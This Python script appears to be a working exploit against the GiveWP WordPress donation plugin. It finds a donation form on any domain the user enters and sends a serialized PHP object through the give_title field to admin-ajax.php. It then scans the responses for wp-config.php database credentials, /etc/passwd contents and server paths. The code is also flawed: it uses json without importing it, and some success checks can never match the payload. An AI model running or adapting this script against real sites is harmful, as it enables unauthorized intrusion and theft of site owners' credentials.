import requests
import random
import string
import logging
from bs4 import BeautifulSoup

# Set up logging for detailed output
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

def generate_random_string(length=8):
    """Generate a random string of letters with the specified length."""
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

def find_donation_form(domain):
    """Locate the donation form on the page and extract necessary form details."""
    url = f"https://{domain}"
    try:
        logging.debug(f"Attempting to access: {url}")
        response = requests.get(url)
        logging.debug(f"Received response with status code: {response.status_code}")
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        form = soup.find('form', {'id': lambda x: x and x.startswith('give-form-')})
        if form:
            form_id = form.get('id').split('-')[-1]
            form_url = form.get('action')
            logging.debug(f"Found donation form: form_id={form_id}, form_url={form_url}")
            return form_id, form_url
        else:
            logging.warning("No donation form found on the page.")
    except Exception as e:
        logging.error(f"Error finding donation form: {str(e)}")
    return None, None

def prepare_urls_and_data(domain, payload, form_id, form_url):
    """Prepare the URLs and data for the POST requests."""
    urls = {
        "url1": f'https://{domain}/wp-admin/admin-ajax.php',
        "url2": form_url or f'https://{domain}/give/donation-form/?payment-mode=manual&form-id={form_id}'
    }

    first_name = generate_random_string()
    last_name = generate_random_string()
    email_prefix = generate_random_string()

    data = {
        'give-honeypot': '',
        'give-form-id-prefix': f'{form_id}-1',
        'give-form-id': form_id,
        'give-form-title': '0',
        'give-current-url': f'https://{domain}/',
        'give-form-url': urls["url2"],
        'give-form-minimum': '',
        'give-form-maximum': '999999.99',
        'give-form-hash': generate_random_string(32),
        'give-price-id': '1',
        'give-amount': '25',
        'give_first': first_name,
        'give_last': last_name,
        'give_email': f'{email_prefix}@test.com',
        'payment-mode': 'manual',
        'give_action': 'purchase',
        'give-gateway': 'manual',
        'give_embed_form': '1',
        'action': 'give_process_donation',
        'give_ajax': 'true',
        'give_title': payload
    }

    logging.debug(f"Prepared URLs: {urls}")
    logging.debug(f"Prepared data: {data}")
    return urls, data

def send_exploit(domain):
    """Attempt to exploit the donation form by sending crafted requests."""
    form_id, form_url = find_donation_form(domain)
    if not form_id:
        logging.error("Could not find donation form. Using default values.")
        form_id = '1719'  # Use a hardcoded default value
        form_url = f'https://{domain}/give/donation-form/?payment-mode=manual&form-id={form_id}'

    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Referer': f'https://{domain}/',  # Add a referrer header
    }

    session = requests.Session()

    # Using the simple payload from our previous script
    payload = 'O:5:"TCPDF":1:{s:7:"version";s:5:"4.0.0";}'

    urls, data = prepare_urls_and_data(domain, payload, form_id, form_url)
    try:
        # Send the first request
        logging.info(f"Sending first request to {urls['url1']} with payload: {payload[:50]}...")
        response = session.post(urls['url1'], headers=headers, data=data)
        logging.info(f"First request status: {response.status_code}")
        logging.debug(f"Response Headers: {response.headers}")
        logging.debug(f"Response Content: {response.text[:1000]}")

        if analyze_response(response, payload):
            return True

        if response.status_code == 200:
            logging.info(f"Sending second request to {urls['url2']}")
            data2 = data.copy()
            data2.pop('give_ajax', None)
            data2.pop('action', None)
            response2 = session.post(urls['url2'], headers=headers, data=data2)
            logging.info(f"Second request status: {response2.status_code}")
            logging.debug(f"Response Headers: {response2.headers}")
            logging.debug(f"Response Content: {response2.text[:1000]}")

            if analyze_response(response2, payload):
                return True
    except requests.exceptions.RequestException as e:
        logging.error(f"Error sending request: {str(e)}")

    logging.info("No vulnerability found after trying the payload.")
    return False

def analyze_response(response, payload):
    """Analyze the response to determine if the exploit was successful."""
    logging.info(f"Analyzing response from: {response.url}")
    logging.info(f"Status code: {response.status_code}")

    content_type = response.headers.get('Content-Type', '').lower()
    logging.debug(f"Content-Type: {content_type}")

    if 'application/json' in content_type:
        return analyze_json_response(response.text, payload)
    elif 'text/html' in content_type:
        return analyze_html_response(response.text, payload)
    else:
        logging.info(f"Unknown content type: {content_type}")
        return analyze_unknown_response(response.text, payload)

def analyze_json_response(content, payload):
    """Analyze JSON response content."""
    try:
        json_response = json.loads(content)
        logging.info("Response is in JSON format:")
        logging.debug(json.dumps(json_response, indent=4))
        return check_for_path_info(json.dumps(json_response), payload)
    except json.JSONDecodeError:
        logging.warning("Response claims to be JSON but could not be parsed.")
        logging.info("Raw content:")
        logging.debug(content[:1000])
        return check_for_path_info(content, payload)

def analyze_html_response(content, payload):
    """Analyze HTML response content."""
    soup = BeautifulSoup(content, 'html.parser')
    error_divs = soup.find_all('div', class_='give_error')
    for div in error_divs:
        error_message = div.get_text(strip=True)
        logging.warning(f"Error message found: {error_message}")

    return check_for_path_info(content, payload)

def analyze_unknown_response(content, payload):
    """Analyze unknown format response content."""
    logging.info("Response is in an unknown format. Displaying raw content:")
    logging.debug(content[:1000])
    return check_for_path_info(content, payload)

def check_for_path_info(content, payload):
    """Check the response content for path-related information."""
    content = content.lower()

    if "wp-config.php" in payload and ("db_name" in content or "db_user" in content):
        logging.info("Successfully accessed wp-config.php. Server is vulnerable.")
        return True

    if "/etc/passwd" in payload and "root:" in content:
        logging.info("Successfully read /etc/passwd. Server is vulnerable.")
        return True

    path_indicators = ["/var/www/", "/home/", "/usr/local/", "/opt/", "/srv/"]
    for indicator in path_indicators:
        if indicator in content:
            logging.info(f"Possible path information found: {indicator}")
            return True

    if "open_basedir restriction in effect" in content:
        logging.info("open_basedir restriction detected. This might limit our ability to traverse directories.")

    return False

# Example usage
domain = input("Please enter the domain (e.g., example.com): ")
if not send_exploit(domain):
    logging.info("Exploit attempt failed or no vulnerabilities found.")
